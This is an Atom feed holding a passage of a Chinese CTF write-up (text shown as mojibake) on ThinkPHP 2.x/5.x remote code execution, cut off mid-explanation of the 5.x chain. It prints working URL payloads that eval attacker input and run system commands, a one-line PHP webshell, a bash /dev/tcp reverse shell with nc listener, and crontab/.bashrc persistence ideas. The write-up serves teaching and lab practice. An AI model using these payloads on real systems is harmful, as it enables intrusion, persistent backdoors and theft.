<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://bae-ace.github.io</id>
    <title>baeçš„åšå®¢ â€¢ Posts by &#34;æ¼æ´åˆ†æ&#34; category</title>
    <link href="https://bae-ace.github.io" />
    <updated>2025-07-28T06:18:44.000Z</updated>
    <category term="å·¥å…·" />
    <category term="sqlmap" />
    <category term="æ¸—é€æµ‹è¯•" />
    <category term="PWN" />
    <category term="ELF" />
    <category term="ROP" />
    <category term="CTF" />
    <category term="äºŒè¿›åˆ¶å®‰å…¨" />
    <category term="Webå®‰å…¨" />
    <category term="SQLæ³¨å…¥" />
    <category term="ç½‘ç»œå®‰å…¨" />
    <category term="Struts2" />
    <category term="RCE" />
    <category term="æ¼æ´å¤ç°" />
    <category term="OGNLæ³¨å…¥" />
    <category term="ThinkPHP" />
    <category term="hexo" />
    <category term="åšå®¢æ­å»º" />
    <category term="åˆå§‹æµ‹è¯•" />
    <category term="linux" />
    <category term="å‘½ä»¤" />
    <category term="å‘½ä»¤æ‰§è¡Œ" />
    <category term="æ¼æ´åˆ©ç”¨" />
    <category term="ä¿¡æ¯æ”¶é›†" />
    <category term="å­åŸŸå" />
    <entry>
        <id>https://bae-ace.github.io/2025/07/28/ThinkPHP-2-x-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-BUUCTF%EF%BC%89/</id>
        <title>ThinkPHP 2.x &amp; 5.x è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åˆ©ç”¨ï¼ˆåŸºäº BUUCTFï¼‰</title>
        <link rel="alternate" href="https://bae-ace.github.io/2025/07/28/ThinkPHP-2-x-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-BUUCTF%EF%BC%89/"/>
        <content type="html">&lt;h1 id=&#34;ThinkPHP-2-x-5-x-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åˆ©ç”¨ï¼ˆåŸºäº-BUUCTFï¼‰&#34;&gt;&lt;a href=&#34;#ThinkPHP-2-x-5-x-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åˆ©ç”¨ï¼ˆåŸºäº-BUUCTFï¼‰&#34; class=&#34;headerlink&#34; title=&#34;ThinkPHP 2.x &amp;amp; 5.x è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åˆ©ç”¨ï¼ˆåŸºäº BUUCTFï¼‰&#34;&gt;&lt;/a&gt;ThinkPHP 2.x &amp;amp; 5.x è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åˆ©ç”¨ï¼ˆåŸºäº BUUCTFï¼‰&lt;/h1&gt;&lt;h2 id=&#34;ä¸€ã€å‰è¨€&#34;&gt;&lt;a href=&#34;#ä¸€ã€å‰è¨€&#34; class=&#34;headerlink&#34; title=&#34;ä¸€ã€å‰è¨€&#34;&gt;&lt;/a&gt;ä¸€ã€å‰è¨€&lt;/h2&gt;&lt;p&gt;ThinkPHP æ˜¯ä¸€ä¸ªå¹¿å—æ¬¢è¿çš„ PHP å¼€å‘æ¡†æ¶ï¼Œä½†å…¶æ—©æœŸç‰ˆæœ¬ï¼ˆ2.x å’Œ 5.0.x è‡³ 5.0.23ï¼‰å› è®¾è®¡ç¼ºé™·å­˜åœ¨ä¸¥é‡çš„&lt;strong&gt;è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰æ¼æ´&lt;/strong&gt;ã€‚è¿™äº›æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡ç²¾å¿ƒæ„é€ çš„ URL å‚æ•°æ‰§è¡Œä»»æ„ PHP ä»£ç æˆ–ç³»ç»Ÿå‘½ä»¤ï¼Œç”šè‡³å®ç°æœåŠ¡å™¨å®Œå…¨æ§åˆ¶ã€‚æœ¬æ–‡åŸºäº &lt;strong&gt;BUUCTF&lt;/strong&gt; åœ¨çº¿é¶åœºï¼Œè¯¦ç»†å¤ç° ThinkPHP 2.x å’Œ 5.x çš„ RCE æ¼æ´ï¼Œæ¶µç›–æ¼æ´åŸç†ã€åˆ©ç”¨è¿‡ç¨‹ã€èšå‰‘è¿æ¥ä»¥åŠåé—¨æ¤å…¥çš„å¯èƒ½æ€§ï¼Œæ—¨åœ¨å¸®åŠ©å®‰å…¨ä»ä¸šè€…å’Œå¼€å‘è€…æ·±å…¥ç†è§£å’Œé˜²èŒƒæ­¤ç±»æ¼æ´ã€‚&lt;/p&gt;
&lt;p&gt;æœ¬æ–‡å°†åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;ThinkPHP 2.x RCE æ¼æ´&lt;/strong&gt;ï¼šåˆ©ç”¨æ¨¡æ¿å˜é‡è§£æç¼ºé™·æ‰§è¡Œä»£ç å’Œå‘½ä»¤ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ThinkPHP 5.x RCE æ¼æ´&lt;/strong&gt;ï¼šé€šè¿‡æ¡†æ¶è·¯ç”±è°ƒç”¨ä»»æ„å‡½æ•°å®ç°ä»£ç æ‰§è¡Œã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;äºŒã€ThinkPHP-2-x-RCE-æ¼æ´å¤ç°&#34;&gt;&lt;a href=&#34;#äºŒã€ThinkPHP-2-x-RCE-æ¼æ´å¤ç°&#34; class=&#34;headerlink&#34; title=&#34;äºŒã€ThinkPHP 2.x RCE æ¼æ´å¤ç°&#34;&gt;&lt;/a&gt;äºŒã€ThinkPHP 2.x RCE æ¼æ´å¤ç°&lt;/h2&gt;&lt;h3 id=&#34;1-é¶åœºç¯å¢ƒ&#34;&gt;&lt;a href=&#34;#1-é¶åœºç¯å¢ƒ&#34; class=&#34;headerlink&#34; title=&#34;1. é¶åœºç¯å¢ƒ&#34;&gt;&lt;/a&gt;1. é¶åœºç¯å¢ƒ&lt;/h3&gt;&lt;p&gt;BUUCTF æä¾›åœ¨çº¿é¶åœºï¼Œæ— éœ€è‡ªè¡Œæ­å»ºç¯å¢ƒã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ThinkPHP 2.x RCE æ¼æ´åœ°å€&lt;/strong&gt;ï¼š&lt;code&gt;https://buuoj.cn/challenges#[ThinkPHP]2-Rce&lt;/code&gt;&lt;br&gt;å¼€å¯é¶åœºï¼Œè®¿é—®é¡µé¢åï¼Œé€šå¸¸æ˜¾ç¤ºç®€é™‹çš„ ThinkPHP 2.x æ¬¢è¿é¡µé¢ï¼Œä½†åå°éšè—ç€å¼ºå¤§çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œèƒ½åŠ› ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-æ¼æ´åŸç†&#34;&gt;&lt;a href=&#34;#2-æ¼æ´åŸç†&#34; class=&#34;headerlink&#34; title=&#34;2. æ¼æ´åŸç†&#34;&gt;&lt;/a&gt;2. æ¼æ´åŸç†&lt;/h3&gt;&lt;p&gt;ThinkPHP 2.x çš„æ¨¡æ¿å¼•æ“åœ¨å¤„ç† URL å‚æ•°æ—¶ï¼Œç›´æ¥å°†å‚æ•°æ‹¼æ¥ä¸ºæ¨¡æ¿å˜é‡ï¼Œæœªè¿›è¡Œä¸¥æ ¼è¿‡æ»¤ã€‚ä¾‹å¦‚ï¼ŒURL å‚æ•° &lt;code&gt;name=$&amp;#123;@phpinfo()&amp;#125;&lt;/code&gt; ä¼šè¢«è§£æä¸ºï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; $&amp;#123;@&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;phpinfo&lt;/span&gt;()&amp;#125; &lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;ç”±äº &lt;code&gt;@phpinfo()&lt;/code&gt; æ˜¯åˆæ³•çš„ PHP å‡½æ•°è°ƒç”¨ï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œ &lt;code&gt;phpinfo()&lt;/code&gt; å‡½æ•°å¹¶è¿”å›ç»“æœã€‚å¦‚æœç»“åˆ &lt;code&gt;eval()&lt;/code&gt; æˆ– &lt;code&gt;assert()&lt;/code&gt;ï¼Œæ”»å‡»è€…å¯é€šè¿‡ GET æˆ– POST å‚æ•°è¿›ä¸€æ­¥æ‰§è¡Œä»»æ„ä»£ç æˆ–ç³»ç»Ÿå‘½ä»¤ï¼Œå½¢æˆå®Œå…¨æ§åˆ¶ã€‚&lt;/p&gt;
&lt;h3 id=&#34;3-æ¼æ´åˆ©ç”¨è¿‡ç¨‹&#34;&gt;&lt;a href=&#34;#3-æ¼æ´åˆ©ç”¨è¿‡ç¨‹&#34; class=&#34;headerlink&#34; title=&#34;3. æ¼æ´åˆ©ç”¨è¿‡ç¨‹&#34;&gt;&lt;/a&gt;3. æ¼æ´åˆ©ç”¨è¿‡ç¨‹&lt;/h3&gt;&lt;h4 id=&#34;æ­¥éª¤-1ï¼šæµ‹è¯•ä»£ç æ‰§è¡Œï¼ˆPOC1ï¼‰&#34;&gt;&lt;a href=&#34;#æ­¥éª¤-1ï¼šæµ‹è¯•ä»£ç æ‰§è¡Œï¼ˆPOC1ï¼‰&#34; class=&#34;headerlink&#34; title=&#34;æ­¥éª¤ 1ï¼šæµ‹è¯•ä»£ç æ‰§è¡Œï¼ˆPOC1ï¼‰&#34;&gt;&lt;/a&gt;æ­¥éª¤ 1ï¼šæµ‹è¯•ä»£ç æ‰§è¡Œï¼ˆPOC1ï¼‰&lt;/h4&gt;&lt;p&gt;ä½¿ç”¨ä»¥ä¸‹ Payload æµ‹è¯•æ˜¯å¦å¯ä»¥æ‰§è¡Œ PHP ä»£ç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ruby&#34;&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;http:&lt;/span&gt;/&lt;span class=&#34;hljs-regexp&#34;&gt;/node3.buuoj.cn:26104/&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;?s&lt;/span&gt;=&lt;span class=&#34;hljs-regexp&#34;&gt;/index/index&lt;/span&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;/name/&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$&amp;#123;&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;@phpinfo&lt;/span&gt;()&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;ç»“æœ&lt;/strong&gt;ï¼šé¡µé¢è¿”å› &lt;code&gt;phpinfo()&lt;/code&gt; çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯æ˜ä»£ç è¢«æˆåŠŸè§£ææ‰§è¡Œ ã€‚&lt;/p&gt;
&lt;h4 id=&#34;æ­¥éª¤-2ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆPOC2ï¼‰&#34;&gt;&lt;a href=&#34;#æ­¥éª¤-2ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆPOC2ï¼‰&#34; class=&#34;headerlink&#34; title=&#34;æ­¥éª¤ 2ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆPOC2ï¼‰&#34;&gt;&lt;/a&gt;æ­¥éª¤ 2ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆPOC2ï¼‰&lt;/h4&gt;&lt;p&gt;åˆ©ç”¨ &lt;code&gt;eval()&lt;/code&gt; ç»“åˆ GET å‚æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆå¦‚ &lt;code&gt;ls&lt;/code&gt;ï¼‰ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node3.buuoj.cn:26104/?s=/index/index/name=$&amp;#123;@eval($_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;1&lt;/span&gt;])&amp;#125;&amp;amp;1=system(%27ls%27);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;å‚æ•°è¯´æ˜&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;name=$&amp;#123;@eval($_GET[1])&amp;#125;&lt;/code&gt;ï¼šé€šè¿‡ &lt;code&gt;eval()&lt;/code&gt; æ‰§è¡Œ GET å‚æ•° &lt;code&gt;1&lt;/code&gt; çš„å†…å®¹ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1=system(%27ls%27)&lt;/code&gt;ï¼šæ‰§è¡Œ &lt;code&gt;system(&amp;#39;ls&amp;#39;)&lt;/code&gt;ï¼Œå…¶ä¸­ &lt;code&gt;%27&lt;/code&gt; æ˜¯ URL ç¼–ç çš„å•å¼•å· &lt;code&gt;&amp;#39;&lt;/code&gt;ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç»“æœ&lt;/strong&gt;ï¼šé¡µé¢è¿”å›ç›®å½•åˆ—è¡¨ï¼Œä¾‹å¦‚ï¼š&lt;figure class=&#34;highlight axapta&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs axapta&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;index&lt;/span&gt;.php&lt;br&gt;flag&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
è¯´æ˜ &lt;code&gt;ls&lt;/code&gt; å‘½ä»¤æ‰§è¡ŒæˆåŠŸã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;æ­¥éª¤-3ï¼šè¯»å–-Flag-æ–‡ä»¶&#34;&gt;&lt;a href=&#34;#æ­¥éª¤-3ï¼šè¯»å–-Flag-æ–‡ä»¶&#34; class=&#34;headerlink&#34; title=&#34;æ­¥éª¤ 3ï¼šè¯»å– Flag æ–‡ä»¶&#34;&gt;&lt;/a&gt;æ­¥éª¤ 3ï¼šè¯»å– Flag æ–‡ä»¶&lt;/h4&gt;&lt;p&gt;å°è¯•è¯»å– &lt;code&gt;/flag&lt;/code&gt; æ–‡ä»¶å†…å®¹ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node3.buuoj.cn:26104/?s=/index/index/name=$&amp;#123;@eval($_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;1&lt;/span&gt;])&amp;#125;&amp;amp;1=system(%27cat%20flag%27);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;ç»“æœ&lt;/strong&gt;ï¼šé¡µé¢è¿”å›ç±»ä¼¼ä»¥ä¸‹å†…å®¹ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight dust&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs dust&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;hljs-template-variable&#34;&gt;&amp;#123;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;è¿™è¡¨æ˜ç›®æ ‡æœåŠ¡å™¨å·²è¢«å®Œå…¨æ§åˆ¶ ã€‚&lt;/p&gt;
&lt;h3 id=&#34;4-ä½¿ç”¨èšå‰‘è¿æ¥&#34;&gt;&lt;a href=&#34;#4-ä½¿ç”¨èšå‰‘è¿æ¥&#34; class=&#34;headerlink&#34; title=&#34;4. ä½¿ç”¨èšå‰‘è¿æ¥&#34;&gt;&lt;/a&gt;4. ä½¿ç”¨èšå‰‘è¿æ¥&lt;/h3&gt;&lt;p&gt;ä¸ºäº†æ›´æ–¹ä¾¿åœ°æ“ä½œæœåŠ¡å™¨ï¼Œå¯ä»¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬å¹¶ä½¿ç”¨èšå‰‘ï¼ˆAntSwordï¼‰è¿›è¡Œäº¤äº’ã€‚&lt;/p&gt;
&lt;h4 id=&#34;æ„é€ -Payloadï¼š&#34;&gt;&lt;a href=&#34;#æ„é€ -Payloadï¼š&#34; class=&#34;headerlink&#34; title=&#34;æ„é€  Payloadï¼š&#34;&gt;&lt;/a&gt;æ„é€  Payloadï¼š&lt;/h4&gt;&lt;p&gt;ä½¿ç”¨ POST å‚æ•°æ„é€ ä¸€å¥è¯æœ¨é©¬ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node3.buuoj.cn:26104/?s=/index/index/name=$&amp;#123;@eval($_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;1&lt;/span&gt;])&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;èšå‰‘é…ç½®&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;URL&lt;/strong&gt;ï¼š&lt;code&gt;http://node3.buuoj.cn:26104/?s=/index/index/name=$&amp;#123;@eval($_POST[1])&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;å¯†ç &lt;/strong&gt;ï¼š&lt;code&gt;1&lt;/code&gt;ï¼ˆå¯¹åº” &lt;code&gt;$_POST[1]&lt;/code&gt;ï¼‰&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç±»å‹&lt;/strong&gt;ï¼šPHPï¼ˆåŸç”Ÿï¼‰&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç¼–ç &lt;/strong&gt;ï¼šé»˜è®¤&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è¿æ¥æˆåŠŸåï¼Œå¯ä½¿ç”¨èšå‰‘è¿›è¡Œï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å‘½ä»¤è¡Œæ‰§è¡Œ&lt;/li&gt;
&lt;li&gt;æ–‡ä»¶ç®¡ç†ï¼ˆå¦‚ä¸Šä¼ ã€ä¸‹è½½ï¼‰&lt;/li&gt;
&lt;li&gt;ç»ˆç«¯äº¤äº’&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;5-è¿›ä¸€æ­¥æ“ä½œ&#34;&gt;&lt;a href=&#34;#5-è¿›ä¸€æ­¥æ“ä½œ&#34; class=&#34;headerlink&#34; title=&#34;5. è¿›ä¸€æ­¥æ“ä½œ&#34;&gt;&lt;/a&gt;5. è¿›ä¸€æ­¥æ“ä½œ&lt;/h3&gt;&lt;p&gt;åœ¨çœŸå®ç¯å¢ƒä¸­ï¼Œå¯è¿›è¡Œä»¥ä¸‹é«˜çº§æ“ä½œï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;ä¸Šä¼  WebShell&lt;/strong&gt;ï¼š&lt;ul&gt;
&lt;li&gt;åœ¨èšå‰‘ä¸­ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼ˆå¦‚ &lt;code&gt;&amp;lt;?php @eval($_POST[&amp;#39;pass&amp;#39;]);?&amp;gt;&lt;/code&gt;ï¼‰æˆ–å†°èï¼ˆBehinderï¼‰æœ¨é©¬ã€‚&lt;/li&gt;
&lt;li&gt;ä¿å­˜åˆ°å¯è®¿é—®è·¯å¾„ï¼ˆå¦‚ &lt;code&gt;/var/www/html/shell.php&lt;/code&gt;ï¼‰ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;åå¼¹ Shell&lt;/strong&gt;ï¼š&lt;ul&gt;
&lt;li&gt;åœ¨ Kali ä¸Šå¯åŠ¨ç›‘å¬ï¼š&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;nc -lvnp 4444&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;åœ¨èšå‰‘ä¸­æ‰§è¡Œï¼š&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/ä½ çš„IP/4444 0&amp;gt;&amp;amp;1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æŒä¹…åŒ–åé—¨&lt;/strong&gt;ï¼š&lt;ul&gt;
&lt;li&gt;æ·»åŠ è®¡åˆ’ä»»åŠ¡ï¼ˆcrontabï¼‰å®šæ—¶åå¼¹ Shellã€‚&lt;/li&gt;
&lt;li&gt;ä¿®æ”¹ &lt;code&gt;.bashrc&lt;/code&gt; æ–‡ä»¶ï¼Œæ·»åŠ åé—¨å‘½ä»¤ã€‚&lt;/li&gt;
&lt;li&gt;å†™å…¥å®šæ—¶ä»»åŠ¡ï¼ˆå¦‚æ¯åˆ†é’Ÿæ‰§è¡Œåå¼¹ Shellï¼‰ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;ä¸‰ã€ThinkPHP-5-x-RCE-æ¼æ´å¤ç°&#34;&gt;&lt;a href=&#34;#ä¸‰ã€ThinkPHP-5-x-RCE-æ¼æ´å¤ç°&#34; class=&#34;headerlink&#34; title=&#34;ä¸‰ã€ThinkPHP 5.x RCE æ¼æ´å¤ç°&#34;&gt;&lt;/a&gt;ä¸‰ã€ThinkPHP 5.x RCE æ¼æ´å¤ç°&lt;/h2&gt;&lt;h3 id=&#34;1-é¶åœºç¯å¢ƒ-1&#34;&gt;&lt;a href=&#34;#1-é¶åœºç¯å¢ƒ-1&#34; class=&#34;headerlink&#34; title=&#34;1. é¶åœºç¯å¢ƒ&#34;&gt;&lt;/a&gt;1. é¶åœºç¯å¢ƒ&lt;/h3&gt;&lt;p&gt;BUUCTF æä¾› ThinkPHP 5.x åœ¨çº¿é¶åœºï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ThinkPHP 5.x RCE æ¼æ´åœ°å€&lt;/strong&gt;ï¼š&lt;code&gt;https://buuoj.cn/challenges#[ThinkPHP]5-Rce&lt;/code&gt;&lt;br&gt;å¼€å¯é¶åœºï¼Œè®¿é—®é¡µé¢æ˜¾ç¤ºï¼š&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight armasm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs armasm&#34;&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;ThinkPHP&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;V5&lt;/span&gt;&lt;br&gt;åå¹´ç£¨ä¸€å‰‘ - ä¸º API å¼€å‘è®¾è®¡çš„é«˜æ€§èƒ½æ¡†æ¶&lt;br&gt;[ &lt;span class=&#34;hljs-built_in&#34;&gt;V5&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; ç‰ˆæœ¬ç”± ä¸ƒç‰›äº‘ ç‹¬å®¶èµåŠ©å‘å¸ƒ ]&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;è¿™è¡¨æ˜é¶åœºè¿è¡Œ ThinkPHP 5.xï¼ˆç‰ˆæœ¬ &amp;lt;&amp;#x3D; 5.0.23ï¼‰ï¼Œæ¼æ´å¤ç°ç¯å¢ƒå·²å°±ç»ª ã€‚&lt;/p&gt;
&lt;h3 id=&#34;2-æ¼æ´åŸç†-1&#34;&gt;&lt;a href=&#34;#2-æ¼æ´åŸç†-1&#34; class=&#34;headerlink&#34; title=&#34;2. æ¼æ´åŸç†&#34;&gt;&lt;/a&gt;2. æ¼æ´åŸç†&lt;/h3&gt;&lt;p&gt;ThinkPHP 5.x çš„ RCE æ¼æ´æºäºæ¡†æ¶å¯¹ &lt;code&gt;\think\app::invokefunction&lt;/code&gt; æ–¹æ³•çš„æœªæˆæƒè®¿é—®ã€‚æ”»å‡»è€…å¯é€šè¿‡ URL å‚æ•°è°ƒç”¨ &lt;code&gt;call_user_func_array&lt;/code&gt; å‡½æ•°ï¼ŒåŠ¨æ€æ‰§è¡Œä»»æ„ PHP å‡½æ•°ï¼ˆå¦‚ &lt;code&gt;phpinfo&lt;/code&gt;ã€&lt;code&gt;system&lt;/code&gt;ï¼‰ï¼Œå¹¶ä¼ é€’å‚æ•°ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;åˆ©ç”¨é“¾&lt;/strong&gt;ï¼š&lt;/p&gt;
